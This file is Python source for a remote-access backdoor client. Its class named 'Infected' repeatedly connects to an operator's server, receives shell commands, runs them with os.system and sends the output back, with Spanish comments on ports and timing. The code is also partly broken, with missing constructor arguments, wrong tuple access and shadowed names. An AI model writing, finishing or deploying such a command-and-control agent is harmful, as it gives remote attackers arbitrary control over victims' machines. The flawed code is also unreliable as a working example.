import os
import socket
from threading import Thread
from time import sleep
class Infected(Thread):
    mySocket = 0 ;
    myUser = "";
    action = None

    def __init__(self,ip,port):
        self.ServerSocket = (ip,port)
        self.version = 0
        self.myDirection = "aca va la direccion donde va a estar siempre" 
        
    def takeIp(self):
        self.myUser = os.getlogin()
        self.mySocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        
    def apply(self):
        self.mySocket.connect(self.ServerSocket)
        
    def reciveCommand(self,command):
        
        data = os.system(command)
        self.sendData(data)
    
    def update(self,cod,version,program):
        self.version = version    
        
    def sendData(self,data):
        self.mySocket.send(data)
        self.mySocket.close()
        
    def closeConnection(self):
        self.mySocket.close()
        
    def getAction(self):
        return self.mySocket.recv(100)

    def run(self):
        while True:
            self.takeIp()
            self.apply()
            
            actionToDo = self.getAction()
            
            if actionToDo == self.action:
                self.closeConnection()
        
            else:
                self.action = actionToDo
                self.closeConnection()
                ExecuteCommand(self.ServerSocket.first, self.ServerSocket.second +1 ).start() # aca podria tener un puerto especifico definido antes
                
            sleep(240) # 4 min 
        
        
        
        
######### Inicio de  Funcion global ######### 
def establishConnection(ip, puerto):
    socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    socket.connect((ip, puerto))
    return socket

def executeCommand(command):
    return os.system(command)

######### Fin de  Funcion global #########

class ExecuteCommand(Thread):
    
    def __init__(self, ip, port, bufSize):
        self.ip = ip
        self.port = port
        self.bufSize = bufSize
       
    def run(self):
        socket = establishConnection(self.ip, self.port)
        command = socket.recv(self.bufSize)  #buffer size ni idea cuanto ponerle 
        socket.close()
        data = executeCommand(command)
        SendOutputForConsole(data, self.ip, (self.port+1) ).start() # aca podria tener un puerto especifico definido antes

class SendOutputForConsole(Thread):
    
    def __init__(self, data, ip, port):
        self.data = data
        self.ip = ip
        self.port = port
        
    def run(self):        
        socket = establishConnection(self.ip, self.port)
        socket.sendall(self.data)
        socket.close()